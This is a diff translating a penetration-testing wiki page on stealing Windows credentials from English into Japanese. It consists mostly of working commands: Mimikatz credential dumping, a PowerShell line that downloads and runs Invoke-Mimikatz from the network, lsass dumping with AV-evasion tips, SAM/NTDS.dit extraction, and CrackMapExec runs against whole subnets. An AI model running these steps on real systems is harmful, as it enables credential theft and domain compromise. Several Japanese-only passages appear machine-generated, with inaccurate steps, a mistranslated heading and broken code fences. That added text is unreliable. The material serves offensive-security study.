@@ -1,29 +1,28 @@
-# Stealing Windows Credentials
+# Windowsの資格情報の盗み出し
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
 
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**
 
-🐞 Read web3 bug tutorials
+🐞 web3のバグチュートリアルを読む
 
-🔔 Get notified about new bug bounties
+🔔 新しいバグ報奨金について通知を受ける
 
-💬 Participate in community discussions
+💬 コミュニティのディスカッションに参加する
 
-## Credentials Mimikatz
-
+## Mimikatzによる資格情報の模倣
 ```bash
 #Elevate Privileges to extract the credentials
 privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
@@ -37,23 +36,19 @@ lsadump::sam
 #One liner
 mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
-
-**Find other things that Mimikatz can do in** [**this page**](credentials-mimikatz.md)**.**
+**他のMimikatzができることについては、[このページ](credentials-mimikatz.md)を参照してください。**
 
 ### Invoke-Mimikatz
-
 ```bash
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
 Invoke-Mimikatz -DumpCreds #Dump creds from memory
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
 ```
+[**ここでいくつかの可能な資格情報の保護方法について学びましょう。**](credentials-protections.md) **これらの保護方法は、Mimikatzが一部の資格情報を抽出するのを防ぐことができます。**
 
-[**Learn about some possible credentials protections here.**](credentials-protections.md) **This protections could prevent Mimikatz from extracting some credentials.**
+## Meterpreterを使用した資格情報
 
-## Credentials with Meterpreter
-
-Use the [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **that** I have created to **search for passwords and hashes** inside the victim.
-
+被害者の中にあるパスワードとハッシュを検索するために、[**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **を使用してください。**私が作成したものです。
 ```bash
 #Credentials from SAM
 post/windows/gather/smart_hashdump
@@ -70,15 +65,14 @@ mimikatz_command -f "sekurlsa::logonpasswords"
 mimikatz_command -f "lsadump::lsa /inject"
 mimikatz_command -f "lsadump::sam"
 ```
-
-## Bypassing AV
+## AV回避
 
 ### Procdump + Mimikatz
 
-As **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**is a legitimate Microsoft tool**, it's not detected by Defender.\
-You can use this tool to **dump the lsass process**, **download the dump** and **extract** the **credentials locally** from the dump.
+**SysInternalsのProcdump**は、**Microsoftの正規ツール**であるため、Defenderに検出されません。\
+このツールを使用して、**lsassプロセスをダンプ**し、**ダンプをダウンロード**して、**ダンプからローカルにクレデンシャルを抽出**することができます。
 
-{% code title="Dump lsass" %}
+{% code title="lsassのダンプ" %}
 ```bash
 #Local
 C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
@@ -86,9 +80,7 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
-{% endcode %}
-
-{% code title="Extract credentials from the dump" %}
+{% code title="ダンプから資格情報を抽出する" %}
 ```c
 //Load the dump
 mimikatz # sekurlsa::minidump lsass.dmp
@@ -97,113 +89,150 @@ mimikatz # sekurlsa::logonPasswords
 ```
 {% endcode %}
 
-This process is done automatically with [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
+このプロセスは、[SprayKatz](https://github.com/aas-n/spraykatz)を使用して自動的に行われます：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`
 
-**Note**: Some **AV** may **detect** as **malicious** the use of **procdump.exe to dump lsass.exe**, this is because they are **detecting** the string **"procdump.exe" and "lsass.exe"**. So it is **stealthier** to **pass** as an **argument** the **PID** of lsass.exe to procdump **instead o**f the **name lsass.exe.**
+**注意**: 一部の**AV**は、**procdump.exeを使用してlsass.exeをダンプする**ことを**悪意のあるもの**として**検出**する場合があります。これは、彼らが**"procdump.exe"と"lsass.exe"**という文字列を**検出**しているためです。そのため、lsass.exeの**名前**の代わりに、lsass.exeの**PID**をprocdumpに**引数**として**渡す**ことが**ステルス**です。
 
-### Dumping lsass with **comsvcs.dll**
+### **comsvcs.dll**を使用してlsassをダンプする
 
-There’s a DLL called **comsvcs.dll**, located in `C:\Windows\System32` that **dumps process memory** whenever they **crash**. This DLL contains a **function** called **`MiniDumpW`** that is written so it can be called with `rundll32.exe`.\
-The first two arguments are not used, but the third one is split into 3 parts. First part is the process ID that will be dumped, second part is the dump file location, and third part is the word **full**. There is no other choice.\
-Once these 3 arguments has been parsed, basically this DLL creates the dump file, and dumps the specified process into that dump file.\
-Thanks to this function, we can use **comsvcs.dll** to dump lsass process instead of uploading procdump and executing it. (This information was extracted from [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/))
-
+`C:\Windows\System32`にある**comsvcs.dll**というDLLは、プロセスが**クラッシュ**するときに**プロセスメモリをダンプ**する役割を持っています。このDLLには、`rundll32.exe`で呼び出すことができる**`MiniDumpW`**という関数が含まれています。\
+最初の2つの引数は使用されませんが、3番目の引数は3つの部分に分割されます。最初の部分はダンプされるプロセスのID、2番目の部分はダンプファイルの場所、3番目の部分は**full**という単語です。他の選択肢はありません。\
+これらの3つの引数が解析されると、基本的にこのDLLはダンプファイルを作成し、指定したプロセスをそのダンプファイルにダンプします。\
+この関数のおかげで、procdumpをアップロードして実行する代わりに、lsassプロセスをダンプするために**comsvcs.dll**を使用することができます。（この情報は[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)から抽出されました）
 ```
 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 ```
+この技術は**SYSTEM**としてのみ実行できることを念頭に置いておく必要があります。
 
-We just have to keep in mind that this technique can only be executed as **SYSTEM**.
+**[lssasy](https://github.com/Hackndo/lsassy)**を使用して、このプロセスを自動化することができます。
 
-**You can automate this process with** [**lssasy**](https://github.com/Hackndo/lsassy)**.**
+### タスクマネージャを使用してlsassをダンプする
 
-### **Dumping lsass with Task Manager**
+1. タスクバーを右クリックし、タスクマネージャをクリックします。
+2. 「詳細」をクリックします。
+3. プロセスタブで「Local Security Authority Process」プロセスを検索します。
+4. 「Local Security Authority Process」プロセスを右クリックし、「ダンプファイルの作成」をクリックします。
 
-1. Right click on the Task Bar and click on Task Manager
-2. Click on More details
-3. Search for "Local Security Authority Process" process in the Processes tab
-4. Right click on "Local Security Authority Process" process and click on "Create dump file".
+### procdumpを使用してlsassをダンプする
 
-### Dumping lsass with procdump
-
-[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Microsoft signed binary which is a part of [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
-
+[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)は、[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)スイートの一部である、Microsoftによって署名されたバイナリです。
 ```
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-
 ## CrackMapExec
 
-### Dump SAM hashes
+### SAMハッシュのダンプ
 
+CrackMapExecは、Windowsシステムでの認証情報の収集に使用される強力なツールです。このツールを使用すると、SAMデータベースからユーザーのハッシュをダンプすることができます。
+
+以下のコマンドを使用して、CrackMapExecを使用してSAMハッシュをダンプする方法を学びましょう。
+
+```plaintext
+crackmapexec <target> -u <username> -p <password> --sam
+```
+
+このコマンドでは、`<target>`にはターゲットのIPアドレスまたはホスト名を指定し、`<username>`と`<password>`には有効な認証情報を入力します。`--sam`フラグを使用することで、SAMハッシュのダンプが有効になります。
+
+CrackMapExecは、リモートで実行されるため、ターゲットシステムへのアクセス権が必要です。また、実行するユーザーには適切な特権が必要です。
+
+この方法を使用すると、Windowsシステムでの認証情報の収集が容易になります。ただし、合法的な目的のためにのみ使用してください。
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
 ```
+### LSAシークレットのダンプ
 
-### Dump LSA secrets
+LSA（Local Security Authority）シークレットは、Windowsシステムで保存される重要な認証情報です。これには、ユーザーのパスワードや暗号化キーなどが含まれます。ハッカーは、LSAシークレットをダンプすることで、これらの機密情報を盗むことができます。
 
+以下の手順を使用して、LSAシークレットをダンプすることができます。
+
+1. ハッカーは、システムにアクセスするための特権を取得する必要があります。これには、管理者権限の取得やシステムへの侵入が含まれます。
+
+2. ハッカーは、ダンプツールを使用してLSAシークレットを取得します。一般的なツールには、MimikatzやGsecdumpなどがあります。
+
+3. ハッカーは、ダンプされたLSAシークレットを解析して、含まれる認証情報を取得します。これには、ユーザーのパスワードや暗号化キーなどが含まれます。
+
+LSAシークレットのダンプは、ハッカーによる悪意のある活動に使用される可能性があります。したがって、システムのセキュリティを強化するためには、適切なセキュリティ対策を実施することが重要です。
 ```
 cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
 ```
+### ターゲットDCからNTDS.ditをダンプする
 
-### Dump the NTDS.dit from target DC
+```plaintext
+NTDS.dit```は、Active Directoryデータベースファイルであり、ユーザーの認証情報を含んでいます。このファイルをダンプすることで、ユーザーの資格情報を取得することができます。
 
+以下の手順に従って、ターゲットDCからNTDS.ditをダンプします。
+
+1. リモートデスクトップまたはSSHを使用して、ターゲットDCに接続します。
+2. 必要な特権を取得するために、適切なユーザーアカウントを使用します。
+3. コマンドプロンプトまたはPowerShellを開きます。
+4. NTDS.ditをダンプするためのツールを使用します。一般的なツールには、`ntdsutil`や`mimikatz`があります。
+5. ツールを使用して、NTDS.ditをダンプします。ダンプされたファイルは、ローカルマシンに保存されます。
+
+以上の手順に従うことで、ターゲットDCからNTDS.ditをダンプすることができます。このダンプファイルには、ユーザーの資格情報が含まれているため、慎重に取り扱ってください。
 ```
 cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 #~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
 ```
+### ターゲットDCからNTDS.ditのパスワード履歴をダンプする
 
-### Dump the NTDS.dit password history from target DC
+```plaintext
+1. Mimikatzを使用して、ターゲットDCにアクセスします。
+2. `lsadump::lsa /inject`コマンドを実行して、LSAプロセスにインジェクションします。
+3. `lsadump::dcsync /domain:<domain_name> /all /csv`コマンドを実行して、NTDS.ditのパスワード履歴をダンプします。
+4. ダンプされたファイルには、ユーザーのパスワードハッシュが含まれています。
+```
 
+この手順に従って、ターゲットDCからNTDS.ditのパスワード履歴をダンプすることができます。ダンプされたファイルには、ユーザーのパスワードハッシュが含まれています。
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
+### 各NTDS.ditアカウントのpwdLastSet属性を表示する
 
-### Show the pwdLastSet attribute for each NTDS.dit account
+To show the `pwdLastSet` attribute for each NTDS.dit account, you can use the following command:
 
+```powershell
+Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
+```
+
+This command will retrieve all user accounts from the NTDS.dit database and display the `Name` and `pwdLastSet` attributes for each account.
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
-
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**
 
-🐞 Read web3 bug tutorials
+🐞 web3のバグチュートリアルを読む
 
-🔔 Get notified about new bug bounties
+🔔 新しいバグ報奨金について通知を受ける
 
-💬 Participate in community discussions
+💬 コミュニティディスカッションに参加する
 
-## Stealing SAM & SYSTEM
+## SAMとSYSTEMの盗み出し
 
-This files should be **located** in _C:\windows\system32\config\SAM_ and _C:\windows\system32\config\SYSTEM._ But **you cannot just copy them in a regular way** because they protected.
+これらのファイルは_C:\windows\system32\config\SAM_と_C:\windows\system32\config\SYSTEM_に**配置されているはずです**。しかし、**通常の方法では単にコピーすることはできません**。なぜなら、これらのファイルは保護されているからです。
 
-### From Registry
+### レジストリから
 
-The easiest way to steal those files is to get a copy from the registry:
-
+これらのファイルを盗み出す最も簡単な方法は、レジストリからコピーすることです：
 ```
 reg save HKLM\sam sam
 reg save HKLM\system system
 reg save HKLM\security security
 ```
-
-**Download** those files to your Kali machine and **extract the hashes** using:
-
+**Kaliマシン**にこれらのファイルを**ダウンロード**し、次のコマンドを使用してハッシュを**抽出**します：
 ```
 samdump2 SYSTEM SAM
 impacket-secretsdump -sam sam -security security -system system LOCAL
 ```
+### ボリューム シャドウ コピー
 
-### Volume Shadow Copy
+このサービスを使用して、保護されたファイルのコピーを作成できます。管理者である必要があります。
 
-You can perform copy of protected files using this service. You need to be Administrator.
+#### vssadmin の使用
 
-#### Using vssadmin
-
-vssadmin binary is only available in Windows Server versions
-
+vssadmin バイナリは Windows Server バージョンのみで利用可能です。
 ```bash
 vssadmin create shadow /for=C:
 #Copy SAM
@@ -216,9 +245,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-
-But you can do the same from **Powershell**. This is an example of **how to copy the SAM file** (the hard drive used is "C:" and its saved to C:\users\Public) but you can use this for copying any protected file:
-
+しかし、同じことを**Powershell**からも行うことができます。以下は、**SAMファイルをコピーする方法の例**です（使用するハードドライブは「C：」で、C：\ users \ Publicに保存されます）。ただし、これは保護されたファイルをコピーするために使用できます。
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -227,141 +254,124 @@ $volume=(gwmi win32_shadowcopy -filter "ID='$id'")
 cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
 $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
-
-Code from the book: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
+コードの本文：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
 
 ### Invoke-NinjaCopy
 
-Finally, you could also use the [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) to make a copy of SAM, SYSTEM and ntds.dit.
-
+最後に、[**PSスクリプトInvoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)を使用して、SAM、SYSTEM、およびntds.ditのコピーを作成することもできます。
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
+## **Active Directoryの資格情報 - NTDS.dit**
 
-## **Active Directory Credentials - NTDS.dit**
+**Ntds.ditファイルは、Active Directoryのデータを格納するデータベースです**。ユーザーオブジェクト、グループ、およびグループのメンバーシップに関する情報を含みます。また、ドメイン内のすべてのユーザーのパスワードハッシュも含まれています。
 
-**The Ntds.dit file is a database that stores Active Directory data**, including information about user objects, groups, and group membership. It includes the password hashes for all users in the domain.
+重要なNTDS.ditファイルは、次の場所にあります： _%SystemRoom%/NTDS/ntds.dit_\
+このファイルは、_Extensible Storage Engine_（ESE）と呼ばれるデータベースであり、公式には3つのテーブルで構成されています：
 
-The important NTDS.dit file will be **located in**: _%SystemRoom%/NTDS/ntds.dit_\
-This file is a database _Extensible Storage Engine_ (ESE) and is "officially" composed by 3 tables:
+* **データテーブル**：オブジェクト（ユーザー、グループなど）に関する情報を含みます。
+* **リンクテーブル**：関係（所属しているなど）に関する情報を含みます。
+* **SDテーブル**：各オブジェクトのセキュリティ記述子を含みます。
 
-* **Data Table**: Contains the information about the objects (users, groups...)
-* **Link Table**: Information about the relations (member of...)
-* **SD Table**: Contains the security descriptors of each object
+詳細については、[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)を参照してください。
 
-More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
+Windowsは_Ntdsa.dll_を使用してそのファイルとやり取りし、_lsass.exe_によって使用されます。そのため、**NTDS.dit**ファイルの**一部**は、**`lsass`**メモリの**内部に**配置される可能性があります（おそらくパフォーマンスの向上のために**キャッシュ**が使用されるため、最新にアクセスされたデータを見つけることができます）。
 
-Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).
+#### NTDS.dit内のハッシュの復号化
 
-#### Decrypting the hashes inside NTDS.dit
+ハッシュは3回暗号化されます：
 
-The hash is cyphered 3 times:
+1. **BOOTKEY**と**RC4**を使用して、パスワード暗号化キー（**PEK**）を復号化します。
+2. **PEK**と**RC4**を使用して、**ハッシュ**を復号化します。
+3. **DES**を使用して、**ハッシュ**を復号化します。
 
-1. Decrypt Password Encryption Key (**PEK**) using the **BOOTKEY** and **RC4**.
-2. Decrypt tha **hash** using **PEK** and **RC4**.
-3. Decrypt the **hash** using **DES**.
+**PEK**は、**すべてのドメインコントローラーで同じ値**を持っていますが、**NTDS.dit**ファイル内で**ドメインコントローラーのSYSTEMファイルのBOOTKEY**を使用して**暗号化**されています（ドメインコントローラー間で異なります）。これが、NTDS.ditファイルから資格情報を取得するためには、NTDS.ditファイルとSYSTEMファイル（_C:\Windows\System32\config\SYSTEM_）の両方が必要な理由です。
 
-**PEK** have the **same value** in **every domain controller**, but it is **cyphered** inside the **NTDS.dit** file using the **BOOTKEY** of the **SYSTEM file of the domain controller (is different between domain controllers)**. This is why to get the credentials from the NTDS.dit file **you need the files NTDS.dit and SYSTEM** (_C:\Windows\System32\config\SYSTEM_).
+### Ntdsutilを使用してNTDS.ditをコピーする
 
-### Copying NTDS.dit using Ntdsutil
-
-Available since Windows Server 2008.
-
+Windows Server 2008以降で利用可能です。
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
+[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用して、**ntds.dit**ファイルをコピーすることもできます。**SYSTEMファイル**のコピーも必要です（再び、レジストリからダンプするか、[**ボリュームシャドウコピー**](./#stealing-sam-and-system)トリックを使用してください）。
 
-You could also use the [**volume shadow copy**](./#stealing-sam-and-system) trick to copy the **ntds.dit** file. Remember that you will also need a copy of the **SYSTEM file** (again, [**dump it from the registry or use the volume shadow copy**](./#stealing-sam-and-system) trick).
+### **NTDS.ditからハッシュを抽出する**
 
-### **Extracting hashes from NTDS.dit**
-
-Once you have **obtained** the files **NTDS.dit** and **SYSTEM** you can use tools like _secretsdump.py_ to **extract the hashes**:
-
+**NTDS.dit**と**SYSTEM**のファイルを**取得**したら、_secretsdump.py_などのツールを使用してハッシュを**抽出**できます。
 ```bash
 secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
 ```
-
-You can also **extract them automatically** using a valid domain admin user:
-
+有効なドメイン管理者ユーザーを使用して、それらを自動的に**抽出する**こともできます：
 ```
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ```
+**大きなNTDS.ditファイル**の場合、[gosecretsdump](https://github.com/c-sto/gosecretsdump)を使用して抽出することをおすすめします。
 
-For **big NTDS.dit files** it's recommend to extract it using [gosecretsdump](https://github.com/c-sto/gosecretsdump).
+最後に、**メタスプロイトモジュール** `_post/windows/gather/credentials/domain_hashdump_`または**mimikatz** `lsadump::lsa /inject`を使用することもできます。
 
-Finally, you can also use the **metasploit module**: _post/windows/gather/credentials/domain\_hashdump_ or **mimikatz** `lsadump::lsa /inject`
+### **NTDS.ditからドメインオブジェクトをSQLiteデータベースに抽出する**
 
-### **Extracting domain objects from NTDS.dit to an SQLite database**
-
-NTDS objects can be extracted to an SQLite database with [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Not only secrets are extracted but also the entire objects and their attributes for further information extraction when the raw NTDS.dit file is already retrieved.
-
+NTDSオブジェクトは、[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)を使用してSQLiteデータベースに抽出することができます。秘密情報だけでなく、生のNTDS.ditファイルが既に取得されている場合に、さらなる情報抽出のためにオブジェクト全体とその属性も抽出されます。
 ```
 ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
 ```
-
-The `SYSTEM` hive is optional but allow for secrets decryption (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories). Along with other information, the following data is extracted : user and machine accounts with their hashes, UAC flags, timestamp for last logon and password change, accounts description, names, UPN, SPN, groups and recursive memberships, organizational units tree and membership, trusted domains with trusts type, direction and attributes...
+`SYSTEM`ハイブはオプションですが、シークレットの復号化（NTハッシュ、LMハッシュ、クリアテキストパスワード、Kerberosまたは信頼キー、NTハッシュ、LMハッシュのパスワード履歴などの補足資格情報）を許可します。他の情報と共に、以下のデータが抽出されます：ユーザーアカウントとマシンアカウントとそれらのハッシュ、UACフラグ、最後のログオンとパスワード変更のタイムスタンプ、アカウントの説明、名前、UPN、SPN、グループと再帰的なメンバーシップ、組織単位ツリーとメンバーシップ、信頼されたドメインとその信頼のタイプ、方向、属性...
 
 ## Lazagne
 
-Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). you can use this binary to extract credentials from several software.
-
+[ここ](https://github.com/AlessandroZ/LaZagne/releases)からバイナリをダウンロードします。このバイナリを使用して、さまざまなソフトウェアから資格情報を抽出できます。
 ```
 lazagne.exe all
 ```
-
-## Other tools for extracting credentials from SAM and LSASS
+## SAMとLSASSから資格情報を抽出するための他のツール
 
 ### Windows credentials Editor (WCE)
 
-This tool can be used to extract credentials from the memory. Download it from: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
+このツールはメモリから資格情報を抽出するために使用できます。以下からダウンロードしてください：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)
 
 ### fgdump
 
-Extract credentials from the SAM file
-
+SAMファイルから資格情報を抽出します。
 ```
 You can find this binary inside Kali, just do: locate fgdump.exe
 fgdump.exe
 ```
-
 ### PwDump
 
-Extract credentials from the SAM file
-
+SAMファイルから資格情報を抽出します。
 ```
 You can find this binary inside Kali, just do: locate pwdump.exe
 PwDump.exe -o outpwdump -x 127.0.0.1
 type outpwdump
 ```
-
 ### PwDump7
 
-Download it from:[ http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) and just **execute it** and the passwords will be extracted.
+[ここからダウンロード](http://www.tarasco.org/security/pwdump\_7)して、単に**実行**するだけでパスワードが抽出されます。
 
-## Defenses
+## 防御策
 
-[**Learn about some credentials protections here.**](credentials-protections.md)
+[**ここでいくつかの資格情報の保護方法について学びましょう。**](credentials-protections.md)
 
 ​
 
 <figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>
 
-[**Follow HackenProof**](https://bit.ly/3xrrDrL) **to learn more about web3 bugs**
+[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてさらに学びましょう**
 
-🐞 Read web3 bug tutorials
+🐞 web3のバグチュートリアルを読む
 
-🔔 Get notified about new bug bounties
+🔔 新しいバグバウンティについて通知を受ける
 
-💬 Participate in community discussions
+💬 コミュニティディスカッションに参加する
 
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
+* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
+* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**する[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **ハッキングのトリックを共有するには、PRを** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**
 
 </details>
